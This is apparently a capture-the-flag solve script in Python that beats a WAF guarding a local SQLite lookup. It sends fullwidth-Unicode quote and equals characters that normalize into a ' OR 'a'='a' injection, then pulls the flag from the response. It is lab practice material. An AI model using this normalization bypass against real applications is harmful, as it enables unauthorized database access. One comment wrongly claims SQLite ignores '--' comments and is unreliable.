import requests

BASE_URL = "http://127.0.0.1:5003"

# The WAF blocks these characters: "'", '"', ';', 'union', 'select', '--', '/*'
# The target query is: SELECT value FROM config WHERE key = '{normalized_key}'
# If we want the first row (the admin_note containing the flag), we can do:
# key = ' or 1=1 a   -> becomes: WHERE key = '' or 1=1 a'  (syntax error)
# Better: ' OR 1=1 --  -> But -- is blocked.
# Wait, sqlite ignores `--` for comments. Is `#` a comment in SQLite? No.
# How about we make the query valid without comments?
# WHERE key = 'a' OR '1'='1'
# But we need quotes.
# We can use the fullwidth variants of characters!
# Fullwidth apostrophe: ＇ (U+FF07)
# Fullwidth Equals Sign: ＝ (U+FF1D)
# Fullwidth space: 　 (U+3000) or just normal space (not blocked)
# Let's try payload: admin_note＇ OR ＇1＇＝＇1

print("1. Sending normal valid request...")
r = requests.post(BASE_URL, data={"key": "sys_status"})
print("Status Response:", "Online" in r.text)

print("\n2. Sending WAF-blocked request (admin_note')...")
r = requests.post(BASE_URL, data={"key": "admin_note'"})
print("Blocked?", "Intrusion Attempt Blocked" in r.text)

print("\n3. Sending Unicode Normalization exploit...")
# The payload is: `a＇ OR 1=1 /*` -> but /* is blocked.
# Let's try to match the trailing quote:
# Payload: `＇ OR ＇a＇=＇a`
# Normalizes to: `' OR 'a'='a`
# The query becomes: `SELECT value FROM config WHERE key = '' OR 'a'='a'`
payload = "＇ OR ＇a＇=＇a"
r = requests.post(BASE_URL, data={"key": payload})

if "DAKSHH{" in r.text:
    print("SUCCESS! Found flag in response:")
    for line in r.text.split('\n'):
        if "DAKSHH{" in line:
            print(line.strip())
else:
    print("FAILED! Flag not found. Let's see the response:")
    print(r.text)
